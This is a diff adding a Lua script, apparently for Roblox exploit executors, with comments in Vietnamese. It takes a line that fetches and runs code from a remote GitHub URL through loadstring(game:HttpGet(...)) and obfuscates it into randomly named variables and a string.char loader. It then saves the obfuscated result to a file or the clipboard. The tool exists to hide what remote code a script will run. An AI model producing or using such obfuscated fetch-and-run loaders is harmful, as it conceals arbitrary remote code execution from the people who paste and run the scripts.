@@ -1,0 +1,101 @@
+--[[ WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk! ]]
+
+local function v1(v2)
+    local v3 = {}
+    local v4 = "IllaFUCKvBITCH"
+    
+    for v5 = 1, v2 do
+        local v6 = math.random(5, 20)
+        local v7 = ""
+        
+        for v8 = 1, v6 do
+            local v9 = math.random(1, #v4)
+            v7 = v7 .. v4:sub(v9, v9)
+        end
+        
+        table.insert(v3, v7)
+    end
+    
+    return table.concat(v3, "")
+end
+
+local _ = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kaneeki1/kanneki1/refs/heads/main/ezz"))()
+]]
+
+local _____ = ""
+local v12 = {}
+
+for ____ = 1, #_ do
+    local v10 = string.byte(_, ____ )
+    local v11 = v1(math.random(1, 50))
+    _____ = _____ .. "local " .. v11 .. "='" .. v10 .. "';"
+    table.insert(v12, v11)
+end
+
+local finalString = _____ .. "loadstring(string.char(" .. table.concat(v12, ",") .. "))()"
+
+-- Thay vì print ra console, ta sẽ cố gắng ghi ra file txt ngoài.
+local function try_write_file(filename, content)
+    -- Kiểm tra các API phổ biến của các executor
+    local ok, err
+
+    -- 1) writefile (đa số executor hỗ trợ)
+    if type(writefile) == "function" then
+        ok, err = pcall(function() writefile(filename, content) end)
+        if ok then return true, "Wrote using writefile: "..filename end
+    end
+
+    -- 2) syn.write_file (một số fork/syn wrappers)
+    if type(syn) == "table" and type(syn.write_file) == "function" then
+        ok, err = pcall(function() syn.write_file(filename, content) end)
+        if ok then return true, "Wrote using syn.write_file: "..filename end
+    end
+
+    -- 3) syn and writefile variations
+    if type(syn) == "table" and type(syn.writefile) == "function" then
+        ok, err = pcall(function() syn.writefile(filename, content) end)
+        if ok then return true, "Wrote using syn.writefile: "..filename end
+    end
+
+    -- 4) KRNL / other names: pcall to common alternatives (some executors expose same global)
+    local alt_names = {"write_file", "WriteFile", "Writefile"}
+    for _, name in ipairs(alt_names) do
+        if type(_G[name]) == "function" then
+            ok, err = pcall(function() _G[name](filename, content) end)
+            if ok then return true, "Wrote using global "..name..": "..filename end
+        end
+    end
+
+    return false, err or "no file-write function available"
+end
+
+local function fallback_copy_to_clipboard(content)
+    if type(setclipboard) == "function" then
+        local ok, err = pcall(function() setclipboard(content) end)
+        return ok, err
+    end
+    return false, "no setclipboard available"
+end
+
+-- Tên file bạn muốn lưu
+local outFilename = "output_log.txt" -- nếu executor cho đường dẫn khác thì sửa lại
+
+-- Thực hiện ghi file (ưu tiên)
+local success, message = try_write_file(outFilename, finalString)
+if success then
+    -- Nếu ghi file thành công, in 1 dòng thông báo ngắn
+    print("Saved output to file: " .. outFilename)
+else
+    -- Nếu không có API writefile, thử copy vào clipboard
+    local ok2, err2 = fallback_copy_to_clipboard(finalString)
+    if ok2 then
+        print("No file api found — content copied to clipboard instead.")
+    else
+        -- Cuối cùng, fallback là in ra console (hoặc bạn có thể show GUI trong game)
+        print("Could not write file or clipboard. Reason:", message, err2)
+        print("\n--- BEGIN OUTPUT ---\n")
+        print(finalString)
+        print("\n---  END OUTPUT  ---\n")
+    end
+end
